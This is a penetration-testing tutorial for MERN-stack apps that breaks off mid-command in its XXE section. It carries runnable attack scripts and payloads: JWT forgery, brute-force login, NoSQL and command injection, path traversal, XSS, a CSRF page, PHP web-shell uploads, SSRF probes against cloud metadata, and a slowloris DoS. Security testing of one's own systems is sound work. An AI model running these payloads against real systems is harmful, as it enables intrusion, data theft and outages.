# Complete Attack Testing Guide for MERN Stack Applications
## Ethical Hacking & Penetration Testing Your Own Systems

> ⚠️ **LEGAL WARNING**: Only test applications you own or have explicit written permission to test. Unauthorized testing is illegal and unethical.

---

## Table of Contents
1. [Setting Up Your Testing Environment](#setting-up-testing-environment)
2. [Authentication & Authorization Attacks](#authentication--authorization-attacks)
3. [Injection Attacks](#injection-attacks)
4. [Cross-Site Scripting (XSS) Attacks](#cross-site-scripting-attacks)
5. [Cross-Site Request Forgery (CSRF) Attacks](#csrf-attacks)
6. [API Security Attacks](#api-security-attacks)
7. [Session Management Attacks](#session-management-attacks)
8. [File Upload Attacks](#file-upload-attacks)
9. [Business Logic Attacks](#business-logic-attacks)
10. [Rate Limiting & DoS Attacks](#rate-limiting-attacks)
11. [Cryptography Attacks](#cryptography-attacks)
12. [Advanced Attack Techniques](#advanced-attack-techniques)
13. [Automated Testing Tools](#automated-testing-tools)
14. [Documentation & Reporting](#documentation--reporting)

---

## Setting Up Testing Environment

### 1. Create a Testing Lab

```bash
# Clone your production app to a test environment
git clone your-repo.git test-app
cd test-app

# Use separate database
cp .env .env.test
# Edit .env.test with test database credentials

# Run on different port
PORT=4000 npm start
```

### 2. Essential Tools Installation

```bash
# Browser extensions
# - Firefox: Web Developer, FoxyProxy
# - Chrome: EditThisCookie, ModHeader

# Command-line tools
npm install -g jwt-cli
npm install -g sqlmap
brew install nmap          # Network scanning
brew install wireshark     # Packet analysis
brew install metasploit    # Exploitation framework

# Python tools
pip install requests
pip install beautifulsoup4
pip install selenium
```

### 3. Proxy Setup (Burp Suite)

1. Download Burp Suite Community Edition
2. Configure browser proxy: `127.0.0.1:8080`
3. Install Burp CA certificate
4. Start intercepting traffic

---

## Authentication & Authorization Attacks

### Attack 1: JWT Token Manipulation

**Objective**: Test JWT signature validation

**Steps**:
```bash
# 1. Capture JWT token from browser
# Open DevTools > Application > Cookies or localStorage

# 2. Decode the token
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d

# 3. Test "none" algorithm attack
# Change header to: {"alg":"none","typ":"JWT"}
# Remove signature portion
# Try to authenticate with modified token
```

**Attack Script**:
```javascript
// jwt-test.js
const jwt = require('jsonwebtoken');

// Your captured token
const token = 'paste.your.token.here';

// Decode without verification
const decoded = jwt.decode(token, {complete: true});
console.log('Header:', decoded.header);
console.log('Payload:', decoded.payload);

// Test 1: None algorithm
const noneToken = Buffer.from(JSON.stringify({alg: 'none', typ: 'JWT'})).toString('base64') +
  '.' + Buffer.from(JSON.stringify(decoded.payload)).toString('base64') + '.';
console.log('None algorithm token:', noneToken);

// Test 2: Brute force weak secrets
const weakSecrets = ['secret', '123456', 'password', 'admin', 'test'];
weakSecrets.forEach(secret => {
  try {
    jwt.verify(token, secret);
    console.log(`✓ VULNERABLE! Weak secret found: ${secret}`);
  } catch (e) {
    // Secret doesn't match
  }
});

// Test 3: Modify payload
const modifiedPayload = {...decoded.payload, role: 'admin', isAdmin: true};
const maliciousToken = jwt.sign(modifiedPayload, 'guessed-secret');
console.log('Modified token:', maliciousToken);
```

**Test with curl**:
```bash
# Test with modified token
curl -H "Authorization: Bearer MODIFIED_TOKEN" \
  http://localhost:3000/api/admin/users

# Expected: 401 Unauthorized or 403 Forbidden
# Vulnerable if: 200 OK with admin data
```

### Attack 2: Brute Force Login

**Objective**: Test rate limiting and account lockout

**Attack Script**:
```python
# brute_force.py
import requests
import time

url = 'http://localhost:3000/api/login'
username = 'testuser@example.com'

# Common passwords
passwords = [
    'password', '123456', 'password123', 'admin',
    'letmein', 'welcome', 'monkey', '1234567890'
]

for password in passwords:
    data = {'email': username, 'password': password}
    response = requests.post(url, json=data)
    
    print(f"Trying: {password} - Status: {response.status_code}")
    
    if response.status_code == 200:
        print(f"✓ SUCCESS! Password found: {password}")
        break
    
    if response.status_code == 429:
        print("Rate limited! Good security.")
        break
    
    time.sleep(1)  # Delay between attempts

# Expected: Rate limiting after 5-10 attempts
# Vulnerable if: All attempts allowed without restriction
```

### Attack 3: Password Reset Token Manipulation

**Steps**:
1. Request password reset for your test account
2. Capture reset token from email or URL
3. Try to guess/manipulate token for other users

```bash
# Capture reset URL
# Example: http://localhost:3000/reset?token=abc123xyz

# Test 1: Sequential tokens
curl http://localhost:3000/reset?token=abc123xyz
curl http://localhost:3000/reset?token=abc123xya
curl http://localhost:3000/reset?token=abc123xyb

# Test 2: Predictable tokens
# If token is timestamp-based, calculate neighboring tokens

# Test 3: Token reuse
# Use same token multiple times
curl -X POST http://localhost:3000/api/reset-password \
  -H "Content-Type: application/json" \
  -d '{"token":"abc123xyz","password":"newpass123"}'

# Try again with same token (should fail)
```

### Attack 4: Session Fixation

**Objective**: Force user to use attacker-controlled session

**Steps**:
```bash
# 1. Get a valid session ID
curl -i http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"password"}'

# Extract Set-Cookie header with session ID

# 2. Try to set session before authentication
curl -i http://localhost:3000/api/profile \
  --cookie "sessionId=ATTACKER_SESSION_ID"

# 3. Now login with victim credentials
curl -i http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  --cookie "sessionId=ATTACKER_SESSION_ID" \
  -d '{"email":"victim@test.com","password":"password"}'

# Expected: New session should be generated after login
# Vulnerable if: Same session ID is used after authentication
```

### Attack 5: Privilege Escalation

**Objective**: Attempt to access admin functions as regular user

**Test Cases**:
```bash
# Login as regular user
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"password"}' \
  -c cookies.txt

# Try to access admin endpoints
curl -b cookies.txt http://localhost:3000/api/admin/users
curl -b cookies.txt http://localhost:3000/api/admin/settings
curl -b cookies.txt -X DELETE http://localhost:3000/api/admin/user/123

# Try parameter tampering
curl -b cookies.txt -X PUT http://localhost:3000/api/user/profile \
  -H "Content-Type: application/json" \
  -d '{"name":"Test","role":"admin","isAdmin":true}'

# Expected: 403 Forbidden
# Vulnerable if: Access granted or role changed
```

---

## Injection Attacks

### Attack 6: NoSQL Injection (MongoDB)

**Objective**: Bypass authentication or extract data

**Test 1: Authentication Bypass**:
```bash
# Normal login
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"password"}'

# NoSQL injection attempt
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$ne":null},"password":{"$ne":null}}'

# Another variant
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$gt":""},"password":{"$gt":""}}'

# Expected: Authentication failure
# Vulnerable if: Successfully logged in
```

**Test 2: Data Extraction**:
```javascript
// nosql-injection-test.js
const axios = require('axios');

async function testNoSQLInjection() {
  const baseURL = 'http://localhost:3000';
  
  // Test 1: Regex injection to extract data
  const tests = [
    { username: { $regex: '^admin' } },
    { username: { $regex: '^.*' } },
    { email: { $gt: '' } },
    { password: { $ne: null } },
    { $where: 'this.password.length > 0' }
  ];
  
  for (let payload of tests) {
    try {
      const response = await axios.post(`${baseURL}/api/users/search`, payload);
      console.log('Payload:', payload);
      console.log('Result:', response.data);
      console.log('---');
    } catch (error) {
      console.log('Request blocked or failed');
    }
  }
}

testNoSQLInjection();
```

### Attack 7: Command Injection

**Objective**: Execute system commands

**Test Script**:
```bash
# Test endpoint that processes user input
# Example: Image processing, file operations

# Test 1: Basic command injection
curl "http://localhost:3000/api/convert?file=test.jpg;ls"
curl "http://localhost:3000/api/convert?file=test.jpg|whoami"
curl "http://localhost:3000/api/convert?file=test.jpg`id`"

# Test 2: With URL encoding
curl "http://localhost:3000/api/convert?file=test.jpg%3Bcat%20%2Fetc%2Fpasswd"

# Test 3: Command substitution
curl "http://localhost:3000/api/ping?host=127.0.0.1;cat+/etc/passwd"
curl "http://localhost:3000/api/ping?host=\$(whoami)"

# Expected: Sanitized input or command execution prevented
# Vulnerable if: Command output visible in response
```

### Attack 8: Path Traversal

**Objective**: Access files outside intended directory

```bash
# Test 1: Basic traversal
curl "http://localhost:3000/api/download?file=../../../etc/passwd"
curl "http://localhost:3000/api/download?file=....//....//....//etc/passwd"

# Test 2: URL encoded
curl "http://localhost:3000/api/download?file=..%2F..%2F..%2Fetc%2Fpasswd"
curl "http://localhost:3000/api/download?file=..%252F..%252F..%252Fetc%252Fpasswd"

# Test 3: Null byte injection
curl "http://localhost:3000/api/download?file=../../../etc/passwd%00.png"

# Test 4: Windows paths
curl "http://localhost:3000/api/download?file=..\\..\\..\\windows\\system32\\config\\sam"

# Expected: Access denied or sanitized path
# Vulnerable if: System file contents returned
```

**Automated Script**:
```python
# path_traversal_test.py
import requests

url = 'http://localhost:3000/api/download'
payloads = [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '..%252F..%252F..%252Fetc%252Fpasswd',
    '../../../etc/passwd%00.png',
    '/etc/passwd',
    'file:///etc/passwd',
    '../../../../../../../../../../etc/passwd'
]

for payload in payloads:
    try:
        response = requests.get(url, params={'file': payload})
        print(f"\nPayload: {payload}")
        print(f"Status: {response.status_code}")
        
        if 'root:' in response.text or 'daemon:' in response.text:
            print("✗ VULNERABLE! System file accessed!")
            print(response.text[:200])
    except Exception as e:
        print(f"Error: {e}")
```

---

## Cross-Site Scripting Attacks

### Attack 9: Reflected XSS

**Objective**: Execute JavaScript in victim's browser

**Test Payloads**:
```bash
# Test 1: Basic XSS
curl "http://localhost:3000/search?q=<script>alert('XSS')</script>"

# Test 2: Event handlers
curl "http://localhost:3000/search?q=<img+src=x+onerror=alert('XSS')>"
curl "http://localhost:3000/search?q=<body+onload=alert('XSS')>"

# Test 3: Encoded payloads
curl "http://localhost:3000/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E"

# Test 4: Advanced bypass
curl "http://localhost:3000/search?q=<svg/onload=alert('XSS')>"
curl "http://localhost:3000/search?q=<iframe+src=javascript:alert('XSS')>"
curl "http://localhost:3000/search?q=<input+onfocus=alert('XSS')+autofocus>"

# Expected: Escaped output or CSP blocking execution
# Vulnerable if: Alert box appears in browser
```

**Comprehensive XSS Test Script**:
```javascript
// xss-test.js
const puppeteer = require('puppeteer');

const xssPayloads = [
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "<svg/onload=alert('XSS')>",
  "<iframe src=javascript:alert('XSS')>",
  "<body onload=alert('XSS')>",
  "<input onfocus=alert('XSS') autofocus>",
  "<select onfocus=alert('XSS') autofocus>",
  "<textarea onfocus=alert('XSS') autofocus>",
  "<keygen onfocus=alert('XSS') autofocus>",
  "<video src=x onerror=alert('XSS')>",
  "<audio src=x onerror=alert('XSS')>",
  "'-alert('XSS')-'",
  "\"><script>alert('XSS')</script>",
  "javascript:alert('XSS')",
  "<a href='javascript:alert(\"XSS\")'>Click</a>",
  "<object data='javascript:alert(\"XSS\")'>"
];

async function testXSS(url, paramName) {
  const browser = await puppeteer.launch({ headless: true });
  
  for (let payload of xssPayloads) {
    const page = await browser.newPage();
    
    // Listen for alerts
    page.on('dialog', async dialog => {
      console.log(`✗ VULNERABLE! XSS triggered with: ${payload}`);
      await dialog.dismiss();
    });
    
    try {
      await page.goto(`${url}?${paramName}=${encodeURIComponent(payload)}`);
      await page.waitForTimeout(1000);
    } catch (e) {
      // Error expected for some payloads
    }
    
    await page.close();
  }
  
  await browser.close();
  console.log('XSS testing complete');
}

testXSS('http://localhost:3000/search', 'q');
```

### Attack 10: Stored XSS

**Objective**: Inject persistent malicious scripts

**Test Process**:
```bash
# 1. Create account with XSS in profile
curl -X POST http://localhost:3000/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username":"<script>alert(\"XSS\")</script>",
    "email":"test@test.com",
    "bio":"<img src=x onerror=alert(\"XSS\")>",
    "website":"javascript:alert(\"XSS\")"
  }'

# 2. Post comment with XSS
curl -X POST http://localhost:3000/api/posts/123/comments \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "text":"<svg/onload=alert(\"XSS\")>Check this out!"
  }'

# 3. Update profile picture URL
curl -X PUT http://localhost:3000/api/user/profile \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "avatar":"\" onerror=\"alert(\\\"XSS\\\")\""
  }'

# Expected: Data sanitized before storage and display
# Vulnerable if: Script executes when viewing the content
```

### Attack 11: DOM-based XSS

**Test in Browser Console**:
```javascript
// Test if DOM manipulation is vulnerable
// Visit: http://localhost:3000/#<img src=x onerror=alert('XSS')>

// Test hash-based routing
location.hash = '<script>alert("XSS")</script>';

// Test postMessage vulnerabilities
window.postMessage('<img src=x onerror=alert("XSS")>', '*');

// Test innerHTML usage
document.body.innerHTML += '<img src=x onerror=alert("XSS")>';
```

---

## CSRF Attacks

### Attack 12: Cross-Site Request Forgery

**Objective**: Force authenticated user to perform unwanted actions

**Create Attack Page** (`csrf-attack.html`):
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Test</title>
</head>
<body>
    <h1>CSRF Attack Simulation</h1>
    
    <!-- Test 1: Form Auto-Submit -->
    <form id="csrf-form" action="http://localhost:3000/api/user/delete" method="POST">
        <input type="hidden" name="userId" value="123">
    </form>
    
    <script>
        // Auto-submit form
        document.getElementById('csrf-form').submit();
    </script>
    
    <!-- Test 2: Image-based GET request -->
    <img src="http://localhost:3000/api/user/delete?userId=123" style="display:none">
    
    <!-- Test 3: AJAX request -->
    <script>
        fetch('http://localhost:3000/api/transfer', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                to: 'attacker@evil.com',
                amount: 1000
            })
        })
        .then(r => console.log('CSRF successful'))
        .catch(e => console.log('CSRF blocked:', e));
    </script>
</body>
</html>
```

**Testing Steps**:
1. Login to your app: `http://localhost:3000`
2. Open attack page in same browser: `file:///path/to/csrf-attack.html`
3. Check if actions were performed

**Expected**: CSRF token validation failure or SameSite cookie blocking
**Vulnerable if**: Actions executed without token validation

---

## API Security Attacks

### Attack 13: Mass Assignment

**Objective**: Modify fields that shouldn't be user-editable

```bash
# Test 1: Escalate privileges
curl -X PUT http://localhost:3000/api/user/profile \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test User",
    "role": "admin",
    "isAdmin": true,
    "permissions": ["all"]
  }'

# Test 2: Modify other users
curl -X PUT http://localhost:3000/api/user/profile \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "OTHER_USER_ID",
    "name": "Hacked"
  }'

# Test 3: Set internal fields
curl -X POST http://localhost:3000/api/posts \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Test",
    "authorId": "SOMEONE_ELSE",
    "createdAt": "2020-01-01",
    "verified": true,
    "featured": true
  }'

# Expected: Only whitelisted fields accepted
# Vulnerable if: Unauthorized fields modified
```

### Attack 14: API Rate Limit Bypass

**Test Script**:
```python
# rate_limit_test.py
import requests
import threading
import time

url = 'http://localhost:3000/api/expensive-operation'
headers = {'Authorization': 'Bearer YOUR_TOKEN'}

def make_request(n):
    response = requests.get(url, headers=headers)
    print(f"Request {n}: {response.status_code}")

# Test 1: Rapid sequential requests
print("Test 1: Sequential requests")
for i in range(200):
    make_request(i)
    time.sleep(0.1)

# Test 2: Concurrent requests
print("\nTest 2: Concurrent requests")
threads = []
for i in range(100):
    t = threading.Thread(target=make_request, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

# Test 3: Different IPs (if using proxy rotation)
# Test 4: Different user agents
# Test 5: Different API keys

# Expected: 429 Too Many Requests after limit
# Vulnerable if: All requests succeed
```

### Attack 15: GraphQL Attacks

**If using GraphQL**:

```bash
# Test 1: Introspection (should be disabled in production)
curl -X POST http://localhost:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{__schema{types{name,fields{name}}}}"
  }'

# Test 2: Deep query attack
curl -X POST http://localhost:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{
      users {
        posts {
          comments {
            author {
              posts {
                comments {
                  author {
                    posts {
                      title
                    }
                  }
                }
              }
            }
          }
        }
      }
    }"
  }'

# Test 3: Batch attack
curl -X POST http://localhost:3000/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{users{id,email}}"},
    {"query": "{users{id,email}}"},
    {"query": "{users{id,email}}"}
    // ... repeat 1000 times
  ]'

# Expected: Depth/complexity limits enforced
# Vulnerable if: Server overwhelmed or excessive data returned
```

---

## Session Management Attacks

### Attack 16: Session Hijacking

**Test Methods**:
```bash
# 1. Capture session cookie
# Login and extract session cookie from browser

# 2. Try session cookie from different browser
curl -b "sessionId=CAPTURED_SESSION_ID" \
  http://localhost:3000/api/profile

# 3. Try session cookie from different IP
# Use VPN or proxy to change IP
curl -b "sessionId=CAPTURED_SESSION_ID" \
  -H "X-Forwarded-For: 1.2.3.4" \
  http://localhost:3000/api/profile

# 4. Check session timeout
# Wait 30 minutes and try again

# Expected: Session invalidated or requires re-auth
# Vulnerable if: Session works from any location indefinitely
```

### Attack 17: Session Fixation (Already covered above)

### Attack 18: Concurrent Sessions

```python
# concurrent_sessions_test.py
import requests

url = 'http://localhost:3000/api/login'
credentials = {'email': 'test@test.com', 'password': 'password'}

# Login from multiple locations
sessions = []
for i in range(10):
    response = requests.post(url, json=credentials)
    if response.status_code == 200:
        session_token = response.cookies.get('sessionId')
        sessions.append(session_token)
        print(f"Session {i+1} created: {session_token}")

# Test if all sessions are valid
print("\nTesting concurrent sessions:")
for i, token in enumerate(sessions):
    response = requests.get(
        'http://localhost:3000/api/profile',
        cookies={'sessionId': token}
    )
    print(f"Session {i+1}: {response.status_code}")

# Expected: Limit on concurrent sessions
# Vulnerable if: Unlimited sessions allowed
```

---

## File Upload Attacks

### Attack 19: Malicious File Upload

**Test Cases**:
```bash
# Test 1: Upload executable disguised as image
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer TOKEN" \
  -F "file=@shell.php.jpg"

# Test 2: Double extension
echo 'malicious content' > evil.jpg.php
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer TOKEN" \
  -F "file=@evil.jpg.php"

# Test 3: Null byte injection
echo 'malicious' > evil.php%00.jpg
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer TOKEN" \
  -F "file=@evil.php%00.jpg"

# Test 4: SVG with XSS
cat > xss.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>
EOF
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer TOKEN" \
  -F "file=@xss.svg"

# Test 5: Path traversal in filename
curl -X POST http://localhost:3000/api/upload \
  -H "Authorization: Bearer TOKEN" \
  -F "file=@test.jpg;filename=../../../evil.php"

# Expected: File type validation, sanitized filenames
# Vulnerable if: Arbitrary file execution possible
```

**Comprehensive Upload Test**:
```python
# file_upload_test.py
import requests
import os

url = 'http://localhost:3000/api/upload'
headers = {'Authorization': 'Bearer YOUR_TOKEN'}

test_files = [
    ('shell.php', '<?php system($_GET["cmd"]); ?>'),
    ('shell.php.jpg', '<?php system($_GET["cmd"]); ?>'),
    ('test.jpg.php', '<?php system($_GET["cmd"]); ?>'),
    ('xss.svg', '<svg><script>alert("XSS")</script></svg>'),
    ('xxe.xml', '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
    ('../../../evil.php', '<?php system($_GET["cmd"]); ?>'),
    ('test\x00.php.jpg', '<?php system($_GET["cmd"]); ?>')
]

for filename, content in test_files:
    # Create test file
    with open(filename, 'w') as f:
        f.write(content)
    
    # Upload
    with open(filename, 'rb') as f:
        files = {'file': (filename, f)}
        response = requests.post(url, headers=headers, files=files)
        print(f"\nFile: {filename}")
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text[:100]}")
    
    # Cleanup
    os.remove(filename)

# Expected: Validation errors for malicious files
# Vulnerable if: Files uploaded and executable
```

---

## Business Logic Attacks

### Attack 20: Race Conditions

**Objective**: Exploit timing vulnerabilities

```python
# race_condition_test.py
import requests
import threading

url = 'http://localhost:3000/api/withdraw'
headers = {'Authorization': 'Bearer YOUR_TOKEN'}

def withdraw():
    data = {'amount': 100}
    response = requests.post(url, headers=headers, json=data)
    print(f"Withdraw: {response.status_code} - {response.text}")

# Start 10 concurrent withdrawals
# If account has $150, should only allow 1 withdrawal
threads = []
for i in range(10):
    t = threading.Thread(target=withdraw)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

# Expected: Only legitimate withdrawals succeed
# Vulnerable if: Multiple withdrawals succeed causing negative balance
```

### Attack 21: Price Manipulation

```bash
# Test 1: Negative quantities
curl -X POST http://localhost:3000/api/cart/add \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "productId": "123",
    "quantity": -5,
    "price": 10.00
  }'

# Test 2: Zero price
curl -X POST http://localhost:3000/api/cart/add \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "productId": "123",
    "quantity": 1,
    "price": 0.00
  }'

# Test 3: Manipulate discount
curl -X POST http://localhost:3000/api/checkout \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "items": [...],
    "discount": 100,
    "coupon": "FREEEVERYTHING"
  }'

# Expected: Server-side price validation
# Vulnerable if: Client-provided prices accepted
```

### Attack 22: Parameter Tampering

```bash
# Test 1: Modify user ID in request
curl -X GET http://localhost:3000/api/orders?userId=OTHER_USER_ID \
  -H "Authorization: Bearer TOKEN"

# Test 2: Access other user's data
curl -X GET http://localhost:3000/api/user/OTHER_USER_ID/profile \
  -H "Authorization: Bearer TOKEN"

# Test 3: Boolean manipulation
curl -X POST http://localhost:3000/api/checkout \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "isPremium": true,
    "freeShipping": true,
    "isVerified": true
  }'

# Expected: Authorization checks prevent access to other users
# Vulnerable if: Other users' data accessible
```

---

## Rate Limiting Attacks

### Attack 23: Bypassing Rate Limits

**Objective**: Test rate limit effectiveness

**Test Methods**:
```python
# bypass_rate_limit.py
import requests
import time

url = 'http://localhost:3000/api/login'

# Test 1: IP rotation (requires proxy list)
proxies_list = [
    {'http': 'http://proxy1.com:8080'},
    {'http': 'http://proxy2.com:8080'},
    {'http': 'http://proxy3.com:8080'}
]

for i, proxy in enumerate(proxies_list * 10):
    data = {'email': 'test@test.com', 'password': 'wrong'}
    response = requests.post(url, json=data, proxies=proxy)
    print(f"Request {i}: {response.status_code}")

# Test 2: User-Agent rotation
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64)'
]

for i in range(100):
    headers = {'User-Agent': user_agents[i % len(user_agents)]}
    response = requests.post(url, json={'email': 'test@test.com', 'password': 'wrong'}, headers=headers)
    print(f"Request {i}: {response.status_code}")

# Test 3: Distributed attack simulation
import threading

def attack_thread(thread_id):
    for i in range(20):
        response = requests.post(url, json={'email': 'test@test.com', 'password': 'wrong'})
        print(f"Thread {thread_id}, Request {i}: {response.status_code}")
        time.sleep(0.1)

threads = []
for i in range(10):
    t = threading.Thread(target=attack_thread, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

# Expected: Rate limiting enforced across all methods
# Vulnerable if: Rate limits easily bypassed
```

### Attack 24: Application-Level DoS

**Resource Exhaustion Tests**:
```bash
# Test 1: Large payload
curl -X POST http://localhost:3000/api/posts \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"content\":\"$(python -c 'print("A"*10000000)')\"}"

# Test 2: Complex regex
curl "http://localhost:3000/api/search?q=a{1000000}"

# Test 3: Recursive data structures
curl -X POST http://localhost:3000/api/data \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "data": {
      "nested": {
        "deeply": {
          "very": {
            "much": "..."
          }
        }
      }
    }
  }'
```

**Slowloris Attack Simulation**:
```python
# slowloris_test.py
import socket
import time
import random

host = 'localhost'
port = 3000
socket_count = 200

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(b"GET / HTTP/1.1\r\n")
    s.send(f"Host: {host}\r\n".encode())
    s.send(b"User-Agent: Mozilla/5.0\r\n")
    return s

sockets = []
for i in range(socket_count):
    try:
        s = create_socket()
        sockets.append(s)
        print(f"Socket {i} created")
    except:
        break

# Keep connections alive
while True:
    for s in sockets:
        try:
            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
        except:
            sockets.remove(s)
            try:
                sockets.append(create_socket())
            except:
                pass
    time.sleep(15)

# Expected: Connection limits or timeout protection
# Vulnerable if: Server becomes unresponsive
```

---

## Cryptography Attacks

### Attack 25: Weak Encryption Detection

**Test Script**:
```javascript
// crypto_test.js
const crypto = require('crypto');

// Test if app uses weak algorithms
const weakAlgorithms = ['md5', 'sha1', 'des', 'rc4'];

function testEncryption(data, algorithm) {
  try {
    const hash = crypto.createHash(algorithm).update(data).digest('hex');
    console.log(`✗ WARNING: Using weak algorithm ${algorithm}`);
    return hash;
  } catch (e) {
    console.log(`✓ Algorithm ${algorithm} not available`);
  }
}

// Test password storage
async function testPasswordHashing() {
  const bcrypt = require('bcrypt');
  const password = 'testPassword123';
  
  // Check if bcrypt cost is sufficient
  for (let rounds = 4; rounds <= 15; rounds++) {
    const start = Date.now();
    await bcrypt.hash(password, rounds);
    const time = Date.now() - start;
    console.log(`Rounds: ${rounds}, Time: ${time}ms`);
    
    if (rounds < 10) {
      console.log(`✗ WARNING: Cost factor too low (${rounds})`);
    }
  }
}

testPasswordHashing();
```

### Attack 26: SSL/TLS Attacks

**Test SSL Configuration**:
```bash
# Install testssl.sh
git clone https://github.com/drwetter/testssl.sh.git
cd testssl.sh

# Run comprehensive SSL test
./testssl.sh https://localhost:3000

# Specific tests:
# Test 1: Check for weak ciphers
./testssl.sh --protocols https://localhost:3000

# Test 2: Check certificate validity
./testssl.sh --headers https://localhost:3000

# Test 3: Check for vulnerabilities
./testssl.sh --vulnerable https://localhost:3000

# Manual tests with OpenSSL
openssl s_client -connect localhost:3000 -tls1
openssl s_client -connect localhost:3000 -ssl3
openssl s_client -connect localhost:3000 -cipher 'NULL'

# Expected: Only TLS 1.2+ with strong ciphers
# Vulnerable if: Weak protocols or ciphers accepted
```

### Attack 27: Timing Attacks

**Test Password Comparison**:
```python
# timing_attack.py
import requests
import time
import statistics

url = 'http://localhost:3000/api/verify-token'

def measure_response_time(token):
    times = []
    for _ in range(100):
        start = time.time()
        requests.post(url, json={'token': token})
        end = time.time()
        times.append((end - start) * 1000)
    return statistics.mean(times)

# Test with different tokens
correct_prefix = 'abc123'
for char in 'abcdefghijklmnopqrstuvwxyz0123456789':
    test_token = correct_prefix + char
    avg_time = measure_response_time(test_token)
    print(f"Token: {test_token}, Avg Time: {avg_time:.2f}ms")

# If timing varies significantly, timing attack possible
# Expected: Constant-time comparison
# Vulnerable if: Response time leaks information
```

---

## Advanced Attack Techniques

### Attack 28: Server-Side Request Forgery (SSRF)

**Objective**: Make server perform requests to internal resources

```bash
# Test 1: Internal network access
curl "http://localhost:3000/api/fetch-url?url=http://localhost:6379"
curl "http://localhost:3000/api/fetch-url?url=http://127.0.0.1:27017"
curl "http://localhost:3000/api/fetch-url?url=http://169.254.169.254/latest/meta-data/"

# Test 2: File protocol
curl "http://localhost:3000/api/fetch-url?url=file:///etc/passwd"

# Test 3: URL bypass techniques
curl "http://localhost:3000/api/fetch-url?url=http://127.1"
curl "http://localhost:3000/api/fetch-url?url=http://0177.0.0.1"
curl "http://localhost:3000/api/fetch-url?url=http://[::1]"

# Test 4: Redirect bypass
# Create redirect: evil.com -> http://localhost:6379
curl "http://localhost:3000/api/fetch-url?url=http://evil.com/redirect"

# Expected: Whitelist validation or internal IP blocking
# Vulnerable if: Internal resources accessible
```

**Advanced SSRF Script**:
```python
# ssrf_test.py
import requests

url = 'http://localhost:3000/api/fetch-url'

# Internal services to probe
targets = [
    'http://localhost:22',      # SSH
    'http://localhost:3306',    # MySQL
    'http://localhost:5432',    # PostgreSQL
    'http://localhost:6379',    # Redis
    'http://localhost:27017',   # MongoDB
    'http://localhost:9200',    # Elasticsearch
    'http://127.0.0.1:8080',    # Internal services
    'http://169.254.169.254/latest/meta-data/',  # AWS metadata
    'http://metadata.google.internal/computeMetadata/v1/',  # GCP
    'file:///etc/passwd',
    'file:///etc/hosts',
    'file:///proc/self/environ'
]

# IP encoding variations
variations = [
    'http://127.0.0.1',
    'http://127.1',
    'http://0177.0.0.1',
    'http://0x7f.0x0.0x0.0x1',
    'http://[::1]',
    'http://localhost',
    'http://127.0.0.1.nip.io'
]

for target in targets + variations:
    try:
        response = requests.get(url, params={'url': target}, timeout=5)
        print(f"\nTarget: {target}")
        print(f"Status: {response.status_code}")
        if response.status_code == 200:
            print(f"✗ VULNERABLE! Content: {response.text[:200]}")
    except Exception as e:
        print(f"Blocked or error: {e}")
```

### Attack 29: XML External Entity (XXE)

**If your app processes XML**:

```bash
# Test 1: File disclosure
cat > xxe.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
EOF

curl -X POST http://localhost:3000/api/parse-xml \
  -H "Content-Type: application/xml" \
